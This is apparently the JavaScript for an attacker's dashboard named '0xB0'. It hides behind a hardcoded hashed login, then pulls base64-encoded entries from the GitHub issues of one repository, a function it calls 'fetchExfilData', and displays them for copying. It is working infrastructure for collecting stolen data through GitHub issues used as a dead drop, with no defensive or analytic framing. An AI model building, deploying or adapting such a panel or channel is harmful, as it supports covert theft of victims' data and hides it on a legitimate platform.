(function() {
    'use strict';

    const HASH_USER = '0ca1574299693aaeb821647cf4c897a153bea29fafb12db28257a1ed61ce58d0';
    const HASH_PASS = '7ef461cec5e3f823e0724d62cb57b46e875a8690f1c1917c4d773cb2cb5a86ed';

    async function hashString(str) {
        try {
            const encoder = new TextEncoder();
            const data = encoder.encode(str);
            const hashBuffer = await crypto.subtle.digest('SHA-256', data);
            const hashArray = Array.from(new Uint8Array(hashBuffer));
            return hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
        } catch {
            let hash = 0;
            for (let i = 0; i < str.length; i++) {
                const char = str.charCodeAt(i);
                hash = ((hash << 5) - hash) + char;
                hash = hash & hash;
            }
            return Math.abs(hash).toString(16).padStart(64, '0');
        }
    }

    let loginPage, dashboardPage, loginForm, usernameInput, passwordInput, loginError, logContainer, refreshBtn, logoutBtn;

    function initElements() {
        loginPage = document.getElementById('loginPage');
        dashboardPage = document.getElementById('dashboardPage');
        loginForm = document.getElementById('loginForm');
        usernameInput = document.getElementById('username');
        passwordInput = document.getElementById('password');
        loginError = document.getElementById('loginError');
        logContainer = document.getElementById('logContainer');
        refreshBtn = document.getElementById('refreshBtn');
        logoutBtn = document.getElementById('logoutBtn');
    }

    const SESSION_KEY = '0xB0_auth';

    function isLoggedIn() {
        return sessionStorage.getItem(SESSION_KEY) === 'true';
    }

    function setLoggedIn(state) {
        sessionStorage.setItem(SESSION_KEY, state ? 'true' : 'false');
    }

    function showDashboard() {
        if (!loginPage || !dashboardPage) return;
        loginPage.style.display = 'none';
        dashboardPage.style.display = 'block';
        fetchExfilData();
        if (window._refreshInterval) clearInterval(window._refreshInterval);
        window._refreshInterval = setInterval(fetchExfilData, 30000);
    }

    function showLogin() {
        if (!loginPage || !dashboardPage) return;
        loginPage.style.display = 'block';
        dashboardPage.style.display = 'none';
        if (window._refreshInterval) {
            clearInterval(window._refreshInterval);
            window._refreshInterval = null;
        }
        if (usernameInput) usernameInput.value = '';
        if (passwordInput) passwordInput.value = '';
        if (loginError) loginError.textContent = '';
    }

    function init() {
        initElements();
        if (!loginPage || !dashboardPage) {
            console.error('Required DOM elements missing.');
            return;
        }

        if (loginForm) {
            loginForm.addEventListener('submit', async function(e) {
                e.preventDefault();
                if (!usernameInput || !passwordInput || !loginError) return;
                const user = usernameInput.value.trim();
                const pass = passwordInput.value.trim();

                if (user === '' || pass === '') {
                    loginError.textContent = 'ENTER CREDENTIALS';
                    return;
                }

                const hashUser = await hashString(user);
                const hashPass = await hashString(pass);

                if (hashUser === HASH_USER && hashPass === HASH_PASS) {
                    setLoggedIn(true);
                    loginError.textContent = '';
                    showDashboard();
                } else {
                    loginError.textContent = 'ACCESS DENIED';
                    usernameInput.value = '';
                    passwordInput.value = '';
                    usernameInput.focus();
                }
            });
        }

        if (logoutBtn) {
            logoutBtn.addEventListener('click', function() {
                setLoggedIn(false);
                showLogin();
            });
        }

        if (refreshBtn) {
            refreshBtn.addEventListener('click', function() {
                this.innerHTML = '<i class="fas fa-spinner spinner"></i>';
                fetchExfilData().finally(() => {
                    this.innerHTML = '<i class="fas fa-sync-alt"></i> Refresh';
                });
            });
        }

        if (isLoggedIn()) {
            showDashboard();
        } else {
            showLogin();
        }

        document.addEventListener('keydown', function(e) {
            if (e.key === 'Escape' && isLoggedIn()) {
                setLoggedIn(false);
                showLogin();
            }
        });
    }

    const REPO = 'va1uxxx/0xB0';
    const API_URL = `https://api.github.com/repos/${REPO}/issues`;

    async function fetchExfilData() {
        if (!logContainer) return;
        const placeholder = `<div class="placeholder"><i class="fas fa-spinner spinner"></i> FETCHING DATA...</div>`;
        logContainer.innerHTML = placeholder;
        try {
            const response = await fetch(API_URL, {
                headers: { 'Accept': 'application/vnd.github.v3+json' }
            });
            if (!response.ok) throw new Error(`HTTP ${response.status}`);
            const issues = await response.json();
            if (!Array.isArray(issues) || issues.length === 0) {
                logContainer.innerHTML = `<div class="placeholder"><i class="fas fa-inbox"></i> NO DATA RECEIVED</div>`;
                return;
            }
            const sorted = issues.slice().reverse();
            let html = '';
            sorted.forEach(issue => {
                const title = escapeHtml(issue.title || 'Untitled');
                const time = new Date(issue.created_at).toLocaleString();
                let body = issue.body || '';
                let decoded = '';
                let isTruncated = false;
                try {
                    decoded = atob(body);
                } catch {
                    decoded = body;
                }
                if (decoded.length > 2500) {
                    isTruncated = true;
                    decoded = decoded.substring(0, 2500);
                }
                const displayBody = escapeHtml(decoded);
                const truncatedMark = isTruncated ? ' <span style="color:#4a5a6a;">… (truncated)</span>' : '';
                html += `
                    <div class="entry">
                        <div class="entry-header">
                            <span class="entry-title"><i class="fas fa-file-alt" style="color:#4a5a6a;margin-right:8px;"></i>${title}</span>
                            <span class="entry-time"><i class="far fa-clock"></i> ${time}</span>
                        </div>
                        <div class="entry-body">
                            ${displayBody}${truncatedMark}
                        </div>
                        <div style="text-align:right;margin-top:6px;">
                            <button class="copy-btn" data-copy="${escapeHtml(decoded)}"><i class="fas fa-copy"></i> COPY</button>
                        </div>
                    </div>
                `;
            });
            logContainer.innerHTML = html;
            document.querySelectorAll('.copy-btn').forEach(btn => {
                btn.addEventListener('click', function() {
                    const text = this.getAttribute('data-copy');
                    navigator.clipboard.writeText(text).then(() => {
                        const original = this.innerHTML;
                        this.innerHTML = '<i class="fas fa-check"></i> COPIED';
                        setTimeout(() => { this.innerHTML = original; }, 1500);
                    }).catch(() => {});
                });
            });
        } catch (err) {
            logContainer.innerHTML = `<div class="error-msg"><i class="fas fa-triangle-exclamation"></i> ERROR: ${escapeHtml(err.message)}</div>`;
        }
    }

    function escapeHtml(str) {
        if (!str) return '';
        const map = {
            '&': '&amp;',
            '<': '&lt;',
            '>': '&gt;',
            '"': '&quot;',
            "'": '&#039;'
        };
        return str.replace(/[&<>"']/g, function(m) { return map[m]; });
    }

    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', init);
    } else {
        init();
    }
})();
